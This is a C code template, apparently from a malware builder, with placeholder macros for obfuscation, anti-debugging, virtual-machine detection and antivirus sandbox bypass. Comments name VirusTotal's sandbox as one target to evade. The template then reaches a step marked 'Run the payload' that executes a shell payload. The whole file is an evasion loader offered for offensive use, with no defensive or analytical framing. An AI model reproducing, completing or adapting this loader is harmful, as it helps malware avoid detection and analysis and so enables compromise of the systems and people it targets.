#include <stdio.h>

{{header}}

/**
 * Caller instructions:
 * 
 * {{caller-init}}
 *    Initializes the caller variable.
 * {{caller-var}}
 *    Inserts the caller variable. 
 *    Use it to pass the caller variable to the function as a parameter.
 * {{caller-ptr}}
 *    Inserts the caller pointer.
 *    Use it to pass the caller pointer to the function as a parameter.
 * {{caller-decl-var}}
 *    Inserts the caller variable declaration.
 *    Use it to declare the caller function parameter as a variable.
 * {{caller-decl-ptr}}
 *    Inserts the caller pointer declaration.
 *    Use it to declare the caller function parameter as a pointer.
 * {{caller-cast}}
 *    Declares the caller variable and initializes it by casting from a pointer.
 *    Use it in case of API callback functions with arguments of type void*.
 * {{caller-kernel}}
 *    Gets the 'libc.so' library handle from the caller variable.
 *    Use it to access the kernel module when needed.
 * {{caller-proc}}
 *    Calls the 'dlsym' function from the caller variable.
 *    Use it to get API functions from modules other than the kernel.
 * {{caller-exit}}
 *    Calls the 'exit()' function. It is useful in case of cross-platform development, 
 *    when the C snippet is not dependent on the operating system.
 */

static void *thread_proc(void* arg) {
    {{obf:*}}
    {{obf:*}} struct timespec interval = { 1, ({{value:byte}} + {{value:byte}}) * 1000000L};  // ~1s
    {{caller-cast}}arg;

    {{obf:*}}
    while (1) {
        {{obf:*}} {{dbg:*}}
        {{obf:*}} {{api-n:nanosleep}}(&interval, NULL);
        {{obf:*}}
    }

    {{obf:*}}
}

int main(void) {
    {{obf:*}}
    {{obf:*}}
    {{obf:*}}
    {{caller-init}}

    // Check for the presence of the VM to stop sandbox analysis. For example, the VirusTotal sandbox.
    // This will hide further anti-debugging methods from automated analysis.
    // {{obf:*}} {{vmd:cpuid}}

    // Check for the presence of a debugger to stop or make manual debugging difficult.
    {{obf:*}} {{dbg:*}}
    {{obf:*}}

    pthread_t thread_id;
    if ({{api-n:pthread_create}}(&thread_id, NULL, thread_proc, {{caller-ptr}}) != 0) {
        {{obf:*}}
        return 0;
    }

    // The VM presence checks performed before anti-debugging methods may be easily
    // detected and disabled using manual debugging. So repeat them again.
    // {{obf:*}} {{vmd:cpuid}}

    // Finally, try to bypass the AV sandbox.
    {{obf:*}} {{snd:clone}}
    {{obf:*}} {{snd:*}}
    
    // Run the payload.
    {{obf:*}} {{shell-exec}}
    {{obf:*}}

    return 0;
}
